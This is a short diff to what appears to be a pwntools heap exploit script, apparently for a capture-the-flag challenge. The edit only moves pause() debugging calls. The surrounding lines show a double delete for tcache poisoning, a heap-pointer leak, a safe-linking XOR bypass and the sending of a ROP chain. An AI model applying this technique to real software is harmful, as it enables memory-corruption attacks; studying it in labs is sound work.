@@ -72,7 +72,9 @@ def generate_rop_chain(l):
 def exploit(p,e,l):
     
     delete(p,1)
+    pause()
     delete(p,1)
+    pause()
 
     tcache_mangle = up(use(p,1))
     heap_leak = tcache_mangle << 12
@@ -113,8 +115,6 @@ def exploit(p,e,l):
     log.info(f"Sending rop chain at {hex(target ^ tcache_mangle)}")
 
     create(p,5,p64(target))
-
-    pause()
     create(p,6,b"A")
     create(p,3,generate_rop_chain(l))
  
